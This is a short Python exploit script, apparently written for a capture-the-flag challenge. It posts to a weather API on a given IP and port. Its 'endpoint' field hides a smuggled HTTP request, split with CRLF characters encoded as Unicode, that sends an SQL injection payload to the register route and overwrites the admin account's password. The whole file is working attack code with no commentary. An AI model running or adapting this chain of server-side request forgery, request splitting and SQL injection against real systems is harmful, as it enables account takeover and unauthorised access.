import requests

url = 'http://46.101.33.243:30260'

userline="username=admin&password=admin') ON CONFLICT(username) DO UPDATE SET password='admin';--"


userline = userline.replace("'","%27").replace('"',"%22").replace(" ",u"\u0120")

contentLength = len(userline)

endpoint = "127.0.0.1/ HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\nPOST /register HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + str(contentLength) + "\r\n\r\n" + userline + "\r\n\r\nGET /?a="
endpoint = endpoint.replace("\r", u"\u010D").replace("\n",u"\u010A").replace(" ",u"\u0120")

r = requests.post(url + '/api/weather', json={ 'endpoint' : endpoint, 'city' : 'adf' , 'country' : 'vfda'})
print(r.text)

